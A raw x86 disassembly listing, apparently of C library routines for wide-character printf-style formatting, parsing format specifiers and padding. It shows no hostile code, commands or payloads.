mov ebx, eax
je 0x806c5e3
sub dword [var_1084h], ebx
js 0x806dcc4
mov eax, dword [var_1068h]
test eax, eax
jne 0x806dc53
mov ecx, dword [var_1084h]
test ecx, ecx
jle 0x806dc53
mov eax, dword [var_1084h]
mov edx, dword [arg_8h]
mov dword [var_4h], 0x20
mov dword [var_8h], eax
mov dword [esp], edx
call fcn.08075900
add dword [var_1030h], eax
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x94]
mov dword [esp], ecx
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x806c5e3
mov edx, dword [var_1068h]
add dword [var_1030h], ebx
test edx, edx
je 0x806dcaf
mov eax, dword [var_1084h]
test eax, eax
jle 0x806dcaf
mov eax, dword [var_1084h]
mov edx, dword [arg_8h]
mov dword [var_4h], 0x20
mov dword [var_8h], eax
mov dword [esp], edx
call fcn.08075900
add dword [var_1030h], eax
test edi, edi
je 0x806d9ed
mov dword [esp], esi
call fcn.08051180
jmp 0x806d9ed
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x94]
mov dword [esp], ecx
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x806c5e3
add dword [var_1030h], ebx
jmp 0x806d9ed
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x806dbc5
mov dword [esp], esi
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x806c5e3
mov edi, 1
jmp 0x806dbd1
mov dword [esp], esi
call fcn.08053400
mov ebx, eax
jmp 0x806dbb2
cmp dword [var_1088h], 0xffffffff
je 0x806dd4b
mov edx, dword [var_1088h]
mov dword [esp], esi
mov dword [var_4h], edx
call fcn.080783a0
mov ebx, eax
jmp 0x806dc10
mov dword [esp], esi
call fcn.08077690
jmp 0x806dd44
cmp dword [var_1088h], 0xffffffff
je 0x806dd67
cmp dword [var_1088h], 5
jle 0x806dd76
mov esi, str._null_
mov ebx, 6
jmp 0x806dc10
mov esi, 0x8092948
xor ebx, ebx
jmp 0x806dc10
mov eax, dword [var_1074h]
test eax, eax
jne 0x806dde4
mov edi, dword [var_1080h]
test edi, edi
jne 0x806ddcd
mov esi, dword [var_1078h]
test esi, esi
je 0x806ddb7
mov eax, dword [arg_10h]
mov edi, dword [var_1030h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov word [eax], di
jmp 0x806d9ed
mov eax, dword [arg_10h]
mov ecx, dword [var_1030h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov dword [eax], ecx
jmp 0x806d9ed
mov eax, dword [arg_10h]
movzx edx, byte [var_1030h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov byte [eax], dl
jmp 0x806d9ed
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov ecx, dword [eax]
mov eax, dword [var_1030h]
cdq
mov dword [ecx], eax
mov dword [ecx + 4], edx
jmp 0x806d9ed
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
je 0x806e4a1
mov dword [var_105ch], 0x10
mov dword [var_1058h], eax
mov dword [var_1050h], 0
mov dword [var_1060h], 1
mov dword [var_1070h], 0
mov dword [var_1094h], 0x78
cmp dword [var_1088h], 0
jl 0x806e492
mov dword [var_1090h], 0x20
jne 0x806e36c
mov eax, dword [var_1058h]
test eax, eax
jne 0x806e36c
cmp dword [var_105ch], 8
mov esi, dword [var_103ch]
je 0x806e349
mov eax, dword [var_103ch]
sub eax, esi
sar eax, 2
cmp dword [var_1088h], eax
jg 0x806dec0
mov edi, dword [var_1058h]
test edi, edi
je 0x806dec0
mov ebx, dword [var_1060h]
test ebx, ebx
je 0x806dec0
cmp dword [var_105ch], 8
je 0x806e33b
lea esi, [esi]
mov edx, dword [var_103ch]
mov eax, 0
mov ecx, dword [var_1068h]
sub edx, esi
sar edx, 2
sub dword [var_1088h], edx
cmovns eax, dword [var_1088h]
test ecx, ecx
mov dword [var_1088h], eax
jne 0x806e151
lea eax, [eax + edx]
sub dword [var_1084h], eax
mov eax, dword [var_1058h]
test eax, eax
je 0x806df2b
mov edi, dword [var_1060h]
test edi, edi
je 0x806df2b
mov eax, dword [var_1084h]
sub eax, 2
cmp dword [var_105ch], 0x10
cmovne eax, dword [var_1084h]
mov dword [var_1084h], eax
mov ebx, dword [var_1050h]
test ebx, ebx
jne 0x806df49
mov ecx, dword [var_106ch]
test ecx, ecx
jne 0x806df49
mov edx, dword [var_1064h]
test edx, edx
je 0x806df4f
dec dword [var_1084h]
cmp dword [var_1090h], 0x20
je 0x806e115
mov eax, dword [var_1050h]
test eax, eax
je 0x806e0ae
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806e092
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
mov eax, dword [var_1058h]
test eax, eax
je 0x806dfab
mov eax, dword [var_1060h]
test eax, eax
je 0x806dfab
cmp dword [ebp - 0x105c], 0x10
je 0x806e013
mov edi, dword [var_1088h]
add dword [var_1084h], edi
mov edi, dword [var_1084h]
test edi, edi
jle 0x806dfe4
push ebp
mov ebp, esp
sub esp, 0x30
cmp dword [arg_ch], 0
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
jl 0x8076797
setne al
movzx eax, al
mov dword [var_20h], eax
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x5c]
test eax, eax
jne 0x8076747
cmp dword [var_20h], 0
je 0x8076747
jle 0x807673c
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x58]
mov edx, dword [eax + 4]
lea ebx, [eax + 0x3c]
mov dword [ecx + 0x54], ebx
mov dword [eax + 0x30], 0
mov dword [eax + 0x2c], 0
mov dword [eax], edx
mov edx, dword [eax + 0xc]
mov dword [eax + 0x10], edx
mov eax, dword [ecx + 0x58]
mov dword [eax + 0x34], 0
mov dword [eax + 0x38], 0
lea eax, [var_1ch]
call fcn.08053c20
cmp dword [var_18h], 1
jne 0x8076776
cmp dword [var_10h], 1
jne 0x8076752
cld
mov esi, 0x80a9b40
mov ecx, 0x1e
mov edi, ebx
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_18h]
mov edx, dword [arg_8h]
mov dword [ebx + 0x20], eax
mov eax, dword [var_1ch]
mov dword [ebx + 0x30], 1
mov dword [ebx + 0x34], 0
mov dword [ebx + 0x38], 1
mov dword [ebx + 0x24], eax
mov eax, dword [edx + 0x58]
mov dword [ebx + 0x48], 0
add eax, 0x2c
mov dword [ebx + 0x3c], eax
mov eax, dword [var_10h]
mov dword [ebx + 0x4c], eax
mov eax, dword [var_14h]
mov dword [ebx + 0x5c], 1
mov dword [ebx + 0x60], 0
mov dword [ebx + 0x64], 1
mov dword [ebx + 0x50], eax
mov eax, dword [edx + 0x58]
mov dword [ebx + 0x74], 0x80a9bb8
add eax, 0x2c
mov dword [ebx + 0x68], eax
mov eax, dword [edx + 0x58]
mov eax, dword [eax + 0xb8]
mov dword [edx + 0x94], eax
mov dword [esp], edx
mov dword [var_sp_8h], 0
mov dword [var_sp_ch], 1
mov dword [var_sp_4h], 0
call dword [eax + 0x40]
mov ecx, dword [arg_8h]
mov dword [ecx + 0x4c], eax
mov dword [ecx + 0x50], edx
mov edx, dword [var_20h]
mov eax, dword [arg_8h]
mov dword [eax + 0x5c], edx
mov eax, edx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov dword [var_sp_ch], 0x80a2be0
mov dword [var_sp_8h], 0x89
mov dword [var_sp_4h], str.iofwide.c
mov dword [esp], str.fcts.tomb_nsteps__1
call fcn.0805efc0
mov dword [var_sp_ch], 0x80a2be0
mov dword [var_sp_8h], 0x88
mov dword [var_sp_4h], str.iofwide.c
mov dword [esp], str.fcts.towc_nsteps__1
jmp 0x8076771
mov dword [var_20h], 0xffffffff
jmp 0x8076622
push ebp
mov ebp, esp
push edi
mov edi, edx
push esi
mov esi, eax
push ebx
mov ebx, ecx
sub esp, 0x8190
mov dword [var_4h], 1
mov dword [esp], eax
call fcn.08076600
dec eax
mov edx, 0xffffffff
jne 0x806f472
lea eax, [ebp - 0x80e4]
mov dword [var_4h], edi
mov dword [ebp - 0x8028], esi
mov dword [ebp - 0x8124], eax
mov dword [ebp - 0x8120], 1
mov dword [ebp - 0x817c], 0xfbad8004
lea eax, [ebp - 0x800c]
mov dword [ebp - 0x8134], 0
mov dword [ebp - 0x80e8], 0x80a1580
mov dword [ebp - 0x80d4], eax
mov dword [ebp - 0x80d8], eax
mov dword [var_8h], ebx
lea eax, [var_ch]
mov dword [ebp - 0x80d0], eax
lea eax, [ebp - 0x817c]
mov dword [esp], eax
call fcn.0806b9c0
mov edi, eax
mov eax, 0
test eax, eax
setne al
movzx eax, al
test eax, eax
mov dword [ebp - 0x8190], eax
jne 0x806f4ac
cmp word [esi], 0
jns 0x806f4a2
mov eax, dword [ebp - 0x8124]
mov ebx, dword [eax + 0x10]
sub ebx, dword [eax + 0xc]
sar ebx, 2
test ebx, ebx
jle 0x806f460
mov dword [var_8h], ebx
mov edx, dword [esi + 0x94]
mov eax, dword [eax + 0xc]
mov dword [esp], esi
mov dword [var_4h], eax
call dword [edx + 0x1c]
cmp eax, ebx
mov eax, 0xffffffff
cmovne edi, eax
cmp word [esi], 0
jns 0x806f498
mov edx, dword [ebp - 0x8190]
test edx, edx
jne 0x806f480
mov edx, edi
add esp, 0x8190
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
nop
lea eax, [ebp - 0x818c]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x806f470
mov dword [esp], esi
call fcn.08074580
jmp 0x806f466
mov dword [esp], esi
call fcn.08074540
jmp 0x806f42c
lea eax, [ebp - 0x818c]
mov dword [var_8h], esi
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
call section.
jmp 0x806f426
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [arg_8h]
mov dword [var_4h], 0x25
mov dword [esp], eax
call fcn.080783f0
leave
ret
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov eax, dword [edx]
test eax, eax
je 0x807840d
nop
cmp eax, ecx
je 0x807840d
add edx, 4
mov eax, dword [edx]
test eax, eax
jne 0x8078400
mov eax, edx
leave
ret
push ebp
mov eax, 0
mov ebp, esp
test eax, eax
mov edx, dword [arg_8h]
je 0x807459b
mov eax, dword [edx + 0x48]
mov dword [arg_8h], eax
leave
jmp section.
leave
ret
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov esi, dword [eax]
jmp 0x806db78
mov ebx, dword [var_107ch]
test ebx, ebx
jne case.0x806e931.25
mov ecx, dword [var_1068h]
dec dword [var_1084h]
test ecx, ecx
jne 0x806e51d
mov edx, dword [var_1084h]
test edx, edx
jle 0x806e51d
mov edx, dword [var_1084h]
mov ecx, dword [arg_8h]
mov dword [arg_4h], 0x20
mov dword [arg_8h], edx
mov dword [esp], ecx
call fcn.08075900
add dword [var_1030h], eax
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov dword [esp], eax
call fcn.08077740
mov ecx, eax
jmp 0x806dadc
lea ebx, [var_fech]
xor eax, eax
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_1094h]
rep stosd dword es:[edi], eax
mov eax, dword [var_1084h]
movzx ecx, byte [var_107ch]
mov dword [var_fe4h], edx
mov edi, dword [var_1088h]
movzx edx, byte [var_1078h]
mov dword [var_fe8h], eax
shl ecx, 2
mov dword [var_fech], edi
add edx, edx
movzx eax, byte [var_fe0h]
and eax, 0xfffffffc
or eax, dword [var_1074h]
or eax, edx
movzx edx, byte [var_1060h]
and eax, 0xfffffff3
or eax, ecx
movzx ecx, byte [var_1064h]
shl edx, 3
or eax, edx
movzx edx, byte [var_1068h]
shl ecx, 4
and eax, 0xffffffcf
or eax, ecx
movzx ecx, byte [var_106ch]
shl edx, 5
or eax, edx
movzx edx, byte [var_1070h]
shl ecx, 6
and eax, 0x3f
or eax, ecx
mov ecx, dword [var_1090h]
shl edx, 7
or eax, edx
mov dword [var_fdch], ecx
movzx edx, byte [var_108ch]
mov byte [var_fe0h], al
movzx eax, byte [var_fdfh]
shl edx, 3
or eax, 4
and eax, 0xfffffff7
or eax, edx
mov byte [var_fdfh], al
mov eax, dword [var_1074h]
test eax, eax
je 0x806e65e
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_fc8h], edx
mov dword [var_fc4h], ecx
mov dword [var_fcch], eax
mov esi, dword [arg_8h]
lea eax, [var_fcch]
mov dword [arg_4h], ebx
mov dword [var_ffch], eax
lea eax, [var_ffch]
mov dword [arg_8h], eax
mov dword [esp], esi
call fcn.08067f60
jmp 0x806d9df
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0xfcc]
jmp 0x806e634
mov dword [var_105ch], 0x10
mov eax, dword [var_1074h]
mov dword [var_1050h], 0
mov dword [var_106ch], 0
mov dword [var_1064h], 0
test eax, eax
je 0x806e7e0
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov esi, dword [eax]
mov edi, dword [eax + 4]
mov dword [var_1058h], esi
mov dword [var_1054h], edi
cmp dword [var_1088h], 0
jl 0x806e7d1
mov dword [var_1090h], 0x20
jne 0x806e72c
mov edi, dword [var_1054h]
or edi, dword [var_1058h]
jne 0x806e72c
cmp dword [var_105ch], 8
mov esi, dword [var_103ch]
je 0x806e710
mov edx, dword [var_1058h]
or edx, dword [var_1054h]
setne al
movzx eax, al
mov dword [var_1058h], eax
jmp 0x806de85
mov eax, dword [var_1060h]
test eax, eax
je 0x806e6f3
mov eax, dword [var_103ch]
sub esi, 4
mov dword [eax - 4], 0x30
jmp 0x806e6f3
xor eax, eax
mov esi, dword [var_1058h]
mov edi, dword [var_1054h]
cmp dword [var_1094h], 0x58
mov edx, dword [var_105ch]
sete al
mov ecx, dword [var_103ch]
mov dword [esp], esi
mov dword [arg_4h], edi
mov dword [arg_ch], edx
mov dword [arg_8h], ecx
mov dword [arg_10h], eax
call fcn.0808d930
mov edi, dword [var_1070h]
mov esi, eax
test edi, edi
je 0x806e79d
mov ebx, dword [var_102ch]
test ebx, ebx
je 0x806e79d
mov edi, dword [var_1028h]
mov ecx, dword [var_102ch]
mov edx, dword [var_103ch]
mov dword [esp], edi
call fcn.0806f240
sub esp, 4
mov esi, eax
mov ecx, dword [var_108ch]
test ecx, ecx
je 0x806e6f3
cmp dword [var_105ch], 0xa
jne 0x806e6f3
mov eax, dword [var_103ch]
mov dword [esp], esi
mov dword [arg_4h], eax
call fcn.0806b880
mov esi, eax
jmp 0x806e6f3
mov dword [var_1088h], 1
jmp 0x806e72c
mov edx, dword [var_1080h]
test edx, edx
je 0x806e7ff
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov dword [var_1058h], eax
jmp 0x806de47
mov eax, dword [var_1078h]
test eax, eax
jne 0x806e814
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
jmp 0x806e7f4
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, word [eax]
jmp 0x806e7f4
mov dword [var_105ch], 8
jmp 0x806e679
mov dword [var_105ch], 0xa
jmp 0x806e679
mov eax, dword [var_1074h]
mov dword [var_105ch], 0xa
test eax, eax
je 0x806e883
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov edi, edx
shr edi, 0x1f
mov dword [var_1050h], edi
je 0x806e872
neg eax
adc edx, 0
neg edx
mov dword [var_1058h], eax
mov dword [var_1054h], edx
jmp 0x806e6bd
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov edx, eax
mov ecx, eax
neg edx
shr ecx, 0x1f
cmovne eax, edx
mov dword [var_1050h], ecx
jmp 0x806e7f4
mov esi, dword [arg_8h]
mov edx, dword [esi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806e8c8
mov dword [eax], 0x25
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
jmp 0x806d9ed
mov dword [arg_4h], 0x25
mov dword [esp], esi
call fcn.08075d10
inc eax
jne 0x806e8bd
jmp 0x806c5e3
mov eax, dword [var_ff4h]
mov dword [var_1074h], 1
mov dword [var_107ch], 1
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov esi, dword [var_1094h]
mov eax, dword [esi*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1480]
jmp edx
mov eax, dword [var_ff4h]
mov dword [var_1074h], 1
mov dword [var_107ch], 1
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov ecx, dword [var_1094h]
mov eax, dword [ecx*4 + 0x80a1000]
jmp 0x806e92a
mov dword [var_1074h], 0
mov dword [var_107ch], 0
jmp 0x806e947
mov eax, dword [var_ff4h]
mov dword [var_1074h], 0
mov dword [var_107ch], 0
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edi, dword [var_1094h]
mov eax, dword [edi*4 + 0x80a1000]
jmp 0x806e92a
mov eax, dword [var_ff4h]
mov dword [var_107ch], 1
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
invalid
lea ebp, [edi + ebp*8 - 1]
mov eax, dword [var_ff4h]
mov dword [var_1074h], 0
mov dword [var_107ch], 0
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edi, dword [var_1094h]
mov eax, dword [edi*4 + 0x80a1000]
jmp 0x806e92a
mov eax, dword [var_ff4h]
mov dword [var_107ch], 1
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov ecx, dword [var_1094h]
mov eax, dword [ecx*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1400]
jmp edx
mov eax, dword [var_ff4h]
mov dword [var_1078h], 1
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edi, dword [var_1094h]
mov eax, dword [edi*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1380]
jmp edx
mov ecx, dword [var_ff4h]
mov eax, dword [ecx + 4]
lea edx, [ecx + 4]
mov dword [var_ff4h], edx
cmp eax, 0x2a
je 0x806ec9f
sub eax, 0x30
mov dword [var_1088h], 0
cmp eax, 9
jbe 0x806ec86
mov ecx, dword [var_1084h]
cmp dword [var_1088h], ecx
jle 0x806eb4e
mov eax, dword [var_1088h]
add eax, 0x20
cmp eax, 0x3e8
jle 0x806eb4e
mov ebx, dword [var_1088h]
shl ebx, 2
lea esi, [ebx + 0x80]
cmp esi, 0x1000
ja 0x806ec4e
lea eax, [ebx + 0x90]
sub esp, eax
lea eax, [arg_23h]
and eax, 0xfffffff0
lea eax, [ebx + eax + 0x80]
mov dword [var_103ch], eax
mov eax, dword [var_ff4h]
mov edx, case.0x806bc21.32
mov eax, dword [eax]
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov esi, dword [var_1094h]
mov eax, dword [esi*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1300]
jmp edx
mov dword [var_108ch], 1
jmp 0x806bcfb
lea eax, [var_ff4h]
mov dword [esp], eax
call fcn.0806b980
mov dword [var_1084h], eax
add eax, 0x20
cmp eax, 0x3e7
jle 0x806ebe3
mov ebx, dword [var_1084h]
shl ebx, 2
lea esi, [ebx + 0x80]
cmp esi, 0x1000
ja 0x806ec1d
lea eax, [ebx + 0x90]
sub esp, eax
lea eax, [arg_23h]
and eax, 0xfffffff0
lea eax, [ebx + eax + 0x80]
mov dword [var_103ch], eax
mov eax, dword [var_ff4h]
mov eax, dword [eax]
cmp eax, 0x24
je 0x806c1ed
mov dword [var_1094h], eax
mov edx, case.0x806bc21.32
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edx, dword [var_1094h]
invalid
add al, 0x95
mov ecx, dword [var_ff4h]
mov eax, dword [ecx + 4]
lea edx, [ecx + 4]
mov dword [var_ff4h], edx
cmp eax, 0x2a
je 0x806ec9f
sub eax, 0x30
mov dword [var_1088h], 0
cmp eax, 9
jbe 0x806ec86
mov ecx, dword [var_1084h]
cmp dword [var_1088h], ecx
jle 0x806eb4e
mov eax, dword [var_1088h]
add eax, 0x20
cmp eax, 0x3e8
jle 0x806eb4e
mov ebx, dword [var_1088h]
shl ebx, 2
lea esi, [ebx + 0x80]
cmp esi, 0x1000
ja 0x806ec4e
lea eax, [ebx + 0x90]
sub esp, eax
lea eax, [arg_23h]
and eax, 0xfffffff0
lea eax, [ebx + eax + 0x80]
mov dword [var_103ch], eax
mov eax, dword [var_ff4h]
mov edx, case.0x806bc21.32
mov eax, dword [eax]
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov esi, dword [var_1094h]
mov eax, dword [esi*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1300]
jmp edx
mov dword [var_108ch], 1
jmp 0x806bcfb
lea eax, [var_ff4h]
mov dword [esp], eax
call fcn.0806b980
mov dword [var_1084h], eax
add eax, 0x20
cmp eax, 0x3e7
jle 0x806ebe3
mov ebx, dword [var_1084h]
shl ebx, 2
lea esi, [ebx + 0x80]
cmp esi, 0x1000
ja 0x806ec1d
lea eax, [ebx + 0x90]
sub esp, eax
lea eax, [arg_23h]
and eax, 0xfffffff0
lea eax, [ebx + eax + 0x80]
mov dword [var_103ch], eax
mov eax, dword [var_ff4h]
mov eax, dword [eax]
cmp eax, 0x24
je 0x806c1ed
mov dword [var_1094h], eax
mov edx, case.0x806bc21.32
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edx, dword [var_1094h]
mov eax, dword [edx*4 + 0x80a1000]
jmp 0x806be80
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x806ebc7
mov dword [esp], esi
call fcn.08050fe0
test eax, eax
mov dword [var_1038h], eax
je 0x806c5e3
lea ebx, [ebx + eax + 0x80]
mov dword [var_103ch], ebx
jmp 0x806ebe3
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x806eb32
mov dword [esp], esi
call fcn.08050fe0
test eax, eax
mov dword [var_1038h], eax
je 0x806c5e3
lea ebx, [ebx + eax + 0x80]
mov dword [var_103ch], ebx
jmp 0x806eb4e
lea eax, [var_ff4h]
mov dword [esp], eax
call fcn.0806b980
mov dword [var_1088h], eax
jmp 0x806eaf9
mov eax, dword [ecx + 8]
lea edx, [ecx + 8]
mov dword [var_ff4h], edx
mov dword [var_ff8h], edx
sub eax, 0x30
cmp eax, 9
jbe 0x806ecdf
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
mov dword [var_1088h], eax
jns 0x806eaf9
mov dword [var_1088h], 0xffffffff
jmp 0x806eaf9
lea eax, [var_ff8h]
mov dword [esp], eax
call fcn.0806b980
test eax, eax
je 0x806ecb9
mov eax, dword [var_ff8h]
cmp dword [eax], 0x24
jne 0x806ecb9
jmp 0x806c1ed
mov dword [var_108ch], 1
jmp 0x806bcfb
lea eax, [var_ff4h]
mov dword [esp], eax
call fcn.0806b980
mov dword [var_1084h], eax
add eax, 0x20
cmp eax, 0x3e7
jle 0x806ebe3
mov ebx, dword [var_1084h]
shl ebx, 2
lea esi, [ebx + 0x80]
cmp esi, 0x1000
ja 0x806ec1d
lea eax, [ebx + 0x90]
sub esp, eax
lea eax, [arg_23h]
and eax, 0xfffffff0
lea eax, [ebx + eax + 0x80]
mov dword [var_103ch], eax
mov eax, dword [var_ff4h]
mov eax, dword [eax]
cmp eax, 0x24
je 0x806c1ed
mov dword [var_1094h], eax
mov edx, case.0x806bc21.32
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edx, dword [var_1094h]
mov eax, dword [edx*4 + 0x80a1000]
jmp 0x806be80
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x806ebc7
mov dword [esp], esi
call fcn.08050fe0
test eax, eax
mov dword [var_1038h], eax
je 0x806c5e3
lea ebx, [ebx + eax + 0x80]
mov dword [var_103ch], ebx
jmp 0x806ebe3
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov eax, dword [arg_8h]
mov dword [var_10h], 0
mov ebx, dword [arg_10h]
mov edi, dword [arg_ch]
lea esi, [eax + 4]
movzx edx, byte [ebx + 0xd]
mov dword [arg_8h], esi
mov dword [ebx + 0x24], 0xffffffff
and byte [ebx + 0xc], 7
mov ecx, esi
mov dword [ebx + 0x10], 0x20
and edx, 0xfffffff6
or edx, 4
mov byte [ebx + 0xd], dl
mov eax, dword [eax + 4]
sub eax, 0x30
cmp eax, 9
jbe 0x8074f0b
nop
mov eax, dword [ecx]
sub eax, 0x20
cmp eax, 0x29
ja case.0x8074b7a.33
jmp dword [eax*4 + 0x80a28e0]
or byte [ebx + 0xc], 0x10
mov eax, ecx
add ecx, 4
mov eax, dword [eax + 4]
mov dword [arg_8h], ecx
test eax, eax
jne 0x8074b70
test byte [ebx + 0xc], 0x20
je 0x8074ba1
mov dword [ebx + 0x10], 0x20
mov dword [ebx + 0x20], 0xffffffff
mov dword [ebx + 4], 0
mov edx, ecx
mov eax, dword [ecx]
cmp eax, 0x2a
je 0x8074e6b
sub eax, 0x30
cmp eax, 9
jbe 0x8074e55
mov dword [ebx + 0x1c], 0xffffffff
mov dword [ebx], 0xffffffff
mov edx, ecx
cmp dword [ecx], 0x2e
je 0x8074dbc
and byte [ebx + 0xc], 0xf8
and byte [ebx + 0xd], 0xfd
mov eax, dword [ecx]
add ecx, 4
mov dword [arg_8h], ecx
sub eax, 0x4c
cmp eax, 0x2e
ja case.0x8074bfc.77
jmp dword [eax*4 + 0x80a2988]
mov ecx, dword [arg_8h]
cmp dword [ecx], 0x68
je 0x8074d71
or byte [ebx + 0xc], 2
lea eax, [ecx + 4]
mov edx, dword [ecx]
mov ecx, dword [0x80aad28]
mov dword [arg_8h], eax
test ecx, ecx
mov dword [ebx + 8], edx
jne 0x8074d34
mov ecx, dword [ebx + 8]
mov dword [ebx + 0x2c], 1
lea eax, [ecx - 0x41]
cmp eax, 0x37
ja case.0x8074c42.66
jmp dword [eax*4 + 0x80a2a44]
movzx eax, byte [ebx + 0xc]
test al, 1
je 0x8074ca2
mov dword [ebx + 0x28], 0x100
cmp dword [ebx + 0x24], 0xffffffff
je 0x8074c93
test ecx, ecx
jne 0x8074c80
mov eax, dword [arg_8h]
sub eax, 4
mov dword [ebx + 0x18], eax
mov dword [ebx + 0x14], eax
mov eax, dword [var_10h]
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
lea esi, [esi]
mov eax, dword [arg_8h]
mov dword [ebx + 0x14], eax
mov dword [esp], eax
call fcn.08074b00
mov dword [ebx + 0x18], eax
jmp 0x8074c6e
mov eax, dword [ebx + 0x2c]
test eax, eax
je 0x8074c5e
mov dword [ebx + 0x24], edi
add dword [var_10h], eax
jmp 0x8074c5e
test al, 4
je 0x8074caf
mov dword [ebx + 0x28], 0x200
jmp 0x8074c58
test al, 2
je 0x8074cbc
mov dword [ebx + 0x28], 0x400
jmp 0x8074c58
xor eax, eax
test byte [ebx + 0xd], 2
setne al
mov dword [ebx + 0x28], eax
jmp 0x8074c58
mov dword [ebx + 0x28], 2
jmp 0x8074c58
mov dword [ebx + 0x28], 4
jmp 0x8074c58
mov dword [ebx + 0x28], 1
jmp 0x8074c58
test byte [ebx + 0xc], 1
mov edx, 0x107
mov eax, 7
cmove edx, eax
mov dword [ebx + 0x28], edx
jmp 0x8074c58
mov dword [ebx + 0x28], 0x800
jmp 0x8074c58
mov dword [ebx + 0x28], 5
jmp 0x8074c58
mov dword [ebx + 0x28], 3
jmp 0x8074c58
mov dword [ebx + 0x2c], 0
jmp 0x8074c58
cmp edx, 0xff
jg 0x8074c2c
mov ecx, dword [0x80aad94]
mov eax, dword [ecx + edx*4]
test eax, eax
je 0x8074c2c
lea eax, [ebx + 0x28]
mov dword [var_4h], 1
mov dword [esp], ebx
mov dword [var_8h], eax
call dword [ecx + edx*4]
mov ecx, dword [ebx + 8]
mov dword [ebx + 0x2c], eax
jmp 0x8074c58
add ecx, 4
mov dword [arg_8h], ecx
or byte [ebx + 0xd], 2
jmp 0x8074c13
or byte [ebx + 0xc], 5
mov ecx, dword [arg_8h]
jmp 0x8074c13
or byte [ebx + 0xc], 4
